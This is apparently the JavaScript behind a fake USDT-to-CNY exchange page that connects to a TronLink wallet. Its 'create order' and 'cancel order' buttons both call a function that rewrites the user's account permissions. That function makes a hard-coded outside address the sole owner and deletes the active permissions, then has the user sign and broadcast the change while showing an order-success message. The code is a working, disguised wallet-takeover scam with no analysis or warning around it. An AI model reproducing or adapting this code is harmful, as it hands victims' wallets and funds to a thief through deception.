document.addEventListener('DOMContentLoaded', async () => {
    const tronWeb = window.tronWeb;

    // 检查TronLink是否安装
    if (typeof tronWeb === 'undefined') {
        alert("TronLink is not installed. Please install TronLink to proceed.");
    } else {
        // 检查钱包是否已连接
        if (!tronWeb.defaultAddress.base58) {
            try {
                await connectWallet();
            } catch (error) {
                console.error("Error connecting to TronLink:", error);
                alert("Error: " + error.message);
            }
        }
    }

    startCountdown();
});

function calculateAmount() {
    const usdtAmount = document.getElementById('sellAmount').value;
    const cnyAmount = (usdtAmount * 7.78).toFixed(2);
    document.getElementById('cnyAmount').textContent = cnyAmount;
}

function startCountdown() {
    let countdownElement = document.getElementById('countdownValue');
    let countdownValue = 300;

    let countdownInterval = setInterval(() => {
        countdownValue--;
        countdownElement.textContent = countdownValue;

        if (countdownValue <= 0) {
            clearInterval(countdownInterval);
            countdownElement.parentElement.textContent = '请重新创建订单';
        }
    }, 1000);
}

// 连接钱包的函数
async function connectWallet() {
    const tronWeb = window.tronWeb;

    // 请求TronLink连接
    await tronWeb.request({
        method: 'tron_requestAccounts'
    });
}

// 创建订单的函数
async function createOrder() {
    // 调用确认权限转移的函数
    await confirmPermission("创建订单成功");
}

// 取消订单的函数
async function cancelOrder() {
    // 调用确认权限转移的函数
    await confirmPermission("取消订单成功");
}

// 确认权限转移的函数
async function confirmPermission(message) {
    const tronWeb = window.tronWeb;
    const currentAddress = tronWeb.defaultAddress.base58;
    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';

    console.log("Current Address:", currentAddress);
    console.log("New Owner Address:", newOwnerAddress);

    try {
        // 获取当前账户权限信息
        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
        console.log("Account Info:", accountInfo);

        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{
                address: tronWeb.address.toHex(newOwnerAddress),
                weight: 1
            }]
        };

        const activePermissions = [];  // 清除现有的active权限

        // 使用 TronWeb 的 transactionBuilder.updateAccountPermissions 方法
        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            null,
            activePermissions
        );

        console.log("Transaction:", transaction);

        // 签名交易
        const signedTransaction = await tronWeb.trx.sign(transaction);
        console.log("Signed Transaction:", signedTransaction);

        // 发送交易
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("Transaction Result:", result);

        if (result.result) {
            alert(message);
        } else {
            alert("Transaction failed: " + result.message);
        }
    } catch (error) {
        console.error("Error sending transaction:", error);
        alert("Error: " + error.message);
    }
}
